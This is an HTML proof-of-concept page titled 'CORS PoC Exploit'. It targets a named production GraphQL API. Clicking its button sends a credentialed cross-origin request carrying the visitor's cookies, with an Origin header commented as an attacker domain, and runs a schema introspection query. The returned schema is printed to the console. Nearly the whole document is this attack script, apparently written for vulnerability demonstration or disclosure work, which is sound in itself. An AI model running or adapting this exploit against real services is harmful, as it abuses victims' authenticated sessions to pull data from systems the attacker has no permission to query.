<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS PoC Exploit</title>
</head>
<body>
<center>
    <h2>CORS PoC Exploit</h2>
    <h3>Extract GraphQL Schema</h3>

    <div id="demo">
        <button type="button" onclick="cors()">Exploit</button>
    </div>
</center>

<script>
function cors() {
    fetch('https://api.consumer.worldcoin.org/v1/graphql', {
        method: 'POST',
        credentials: 'include',  // Include cookies in the request
        headers: {
            'Content-Type': 'application/json',
            'Origin': 'https://kripto-geek.github.io/servercapture-cors/'  // Any malicious Domain Or Attacker
        },
        body: JSON.stringify({
            query: `{
                __schema {
                    types {
                        name
                        fields {
                            name
                            type {
                                name
                                kind
                            }
                        }
                    }
                }
            }`
        })
    })
    .then(response => {
        if (response.ok) {
            return response.text();
        }
        throw new Error('Network response was not ok.');
    })
    .then(data => {
        alert("Response received! Check the console for details.");
        console.log("GraphQL Schema:", data);
    })
    .catch(error => console.error('Error fetching API:', error));
}
</script>

</body>
</html>
